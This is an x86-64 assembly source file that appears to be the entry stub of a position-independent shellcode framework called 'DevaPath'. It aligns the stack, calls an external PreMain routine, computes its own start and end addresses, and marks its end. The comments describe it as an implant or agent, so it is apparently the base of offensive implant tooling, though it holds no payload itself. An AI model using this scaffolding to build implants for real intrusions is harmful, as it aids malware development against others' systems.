;;
;; DevaPath - PIC Framework (No PEB→Ldr Walking)
;;

[BITS 64]

DEFAULT REL

;;
;; Import
;;
EXTERN PreMain

;;
;; Export
;;
GLOBAL Start
GLOBAL DpRipStart
GLOBAL DpRipEnd

;;
;; Shellcode entrypoint
;; Aligns the stack by 16-bytes and calls PreMain
;;
[SECTION .text$A]

    Start:
        push  rsi
        mov   rsi, rsp
        and   rsp, 0FFFFFFFFFFFFFFF0h
        sub   rsp, 020h
        call  PreMain
        mov   rsp, rsi
        pop   rsi
        ret

    ;;
    ;; Get RIP to the start of the agent
    ;;
    DpRipStart:
        call DpRipPtrStart
        ret

    DpRipPtrStart:
        mov rax, [rsp]
        sub rax, 0x1b
        ret

;;
;; End of the implant code
;;
[SECTION .text$E]

    DpRipEnd:
        call DpRetPtrEnd
        ret

    DpRetPtrEnd:
        mov rax, [rsp]
        add rax, 0xb
        ret

[SECTION .text$P]

    SymDevaPathEnd:
        db 'D', 'E', 'V', 'A', 'P', 'A', 'T', 'H', '-', 'E', 'N', 'D'
